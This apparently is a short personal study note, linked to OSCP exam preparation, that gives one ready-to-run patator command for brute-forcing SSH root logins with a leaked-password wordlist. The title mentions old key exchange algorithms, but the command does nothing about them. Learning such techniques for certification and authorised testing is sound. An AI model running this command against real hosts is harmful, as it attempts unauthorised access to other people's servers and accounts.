# SSH brute force old key exchange algorithms
```bash
patator ssh_login host=$IP port=22 user=root 0=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt password=FILE0 -x ignore:mesg='Authentication failed'
```

` zet/20221003150344/README.md `

# Related

- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150346](/zet/20221003150346/README.md) SSH brute force
- ~/kb/hacking/misc/bruteforcing-tools.md

Tags:

    #hacking #bruteforcing 
